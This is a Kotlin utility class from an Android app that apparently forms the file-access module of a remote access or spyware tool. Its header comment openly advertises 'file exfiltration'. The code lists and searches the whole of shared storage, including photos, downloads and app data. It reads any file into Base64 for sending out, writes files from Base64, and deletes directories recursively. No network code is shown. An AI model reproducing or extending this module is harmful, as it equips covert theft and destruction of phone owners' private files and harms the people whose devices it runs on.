// ============================================================
// FILE: android/app/src/main/java/com/xrc/utils/FileUtils.kt
// ============================================================
package com.xrc.utils

import android.content.Context
import android.net.Uri
import android.os.Environment
import android.provider.DocumentsContract
import android.util.Base64
import android.util.Log
import androidx.documentfile.provider.DocumentFile
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream

/**
 * FileUtils — file management utilities.
 *
 * Provides:
 * - File listing (with metadata)
 * - File read/write
 * - File search
 * - File exfiltration (Base64 encoding)
 * - Directory traversal
 * - SAF (Storage Access Framework) support for Android 11+
 */
class FileUtils(private val context: Context) {
    companion object {
        private const val TAG = "FileUtils"
        private const val CHUNK_SIZE = 8192
    }

    /**
     * List files in a directory with metadata.
     */
    fun listFiles(path: String): List<Map<String, Any>> {
        val files = mutableListOf<Map<String, Any>>()
        try {
            val dir = File(path)
            if (!dir.exists() || !dir.isDirectory) return files

            for (file in dir.listFiles()?.sortedBy { it.name } ?: emptyList()) {
                files.add(mapOf(
                    "name" to file.name,
                    "path" to file.absolutePath,
                    "is_dir" to file.isDirectory,
                    "size" to file.length(),
                    "last_modified" to file.lastModified(),
                    "permissions" to getPermissions(file)
                ))
            }
        } catch (e: Exception) {
            Log.w(TAG, "List files failed: ${e.message}")
        }
        return files
    }

    /**
     * Read a file and return its content as Base64 string.
     */
    fun readFile(path: String, maxSize: Long = 10485760): String? { // 10MB max
        return try {
            val file = File(path)
            if (!file.exists() || file.isDirectory) return null
            if (file.length() > maxSize) return null

            val bytes = file.readBytes()
            Base64.encodeToString(bytes, Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.w(TAG, "Read file failed: ${e.message}")
            null
        }
    }

    /**
     * Write content to a file.
     */
    fun writeFile(path: String, contentBase64: String): Boolean {
        return try {
            val file = File(path)
            file.parentFile?.mkdirs()
            val bytes = Base64.decode(contentBase64, Base64.NO_WRAP)
            file.writeBytes(bytes)
            true
        } catch (e: Exception) {
            Log.w(TAG, "Write file failed: ${e.message}")
            false
        }
    }

    /**
     * Delete a file or directory.
     */
    fun deleteFile(path: String): Boolean {
        return try {
            val file = File(path)
            if (file.isDirectory) {
                file.deleteRecursively()
            } else {
                file.delete()
            }
        } catch (e: Exception) {
            Log.w(TAG, "Delete failed: ${e.message}")
            false
        }
    }

    /**
     * Search files by name pattern.
     */
    fun searchFiles(query: String, basePath: String = "/storage/emulated/0"): List<Map<String, Any>> {
        val matches = mutableListOf<Map<String, Any>>()
        try {
            val dir = File(basePath)
            if (!dir.exists()) return matches

            dir.walkTopDown().forEach { file ->
                if (file.name.contains(query, ignoreCase = true) && file.length() < 5000000) {
                    matches.add(mapOf(
                        "name" to file.name,
                        "path" to file.absolutePath,
                        "is_dir" to file.isDirectory,
                        "size" to file.length()
                    ))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Search failed: ${e.message}")
        }
        return matches
    }

    /**
     * Get common storage directories.
     */
    fun getCommonDirectories(): List<Map<String, Any>> {
        return listOf(
            mapOf("name" to "Internal Storage", "path" to "/storage/emulated/0"),
            mapOf("name" to "Download", "path" to "/storage/emulated/0/Download"),
            mapOf("name" to "Documents", "path" to "/storage/emulated/0/Documents"),
            mapOf("name" to "Pictures", "path" to "/storage/emulated/0/Pictures"),
            mapOf("name" to "DCIM", "path" to "/storage/emulated/0/DCIM"),
            mapOf("name" to "Music", "path" to "/storage/emulated/0/Music"),
            mapOf("name" to "Movies", "path" to "/storage/emulated/0/Movies"),
            mapOf("name" to "Android/data", "path" to "/storage/emulated/0/Android/data"),
            mapOf("name" to "Android/media", "path" to "/storage/emulated/0/Android/media")
        )
    }

    /**
     * Get storage statistics.
     */
    fun getStorageStats(): Map<String, Any> {
        val storage = Environment.getExternalStorageDirectory()
        val total = storage.totalSpace
        val free = storage.freeSpace
        val used = total - free
        return mapOf(
            "total" to total,
            "free" to free,
            "used" to used,
            "used_percent" to if (total > 0) (used * 100) / total else 0
        )
    }

    private fun getPermissions(file: File): String {
        val r = if (file.canRead()) "r" else "-"
        val w = if (file.canWrite()) "w" else "-"
        val x = if (file.canExecute()) "x" else "-"
        return "$r$w$x"
    }
}
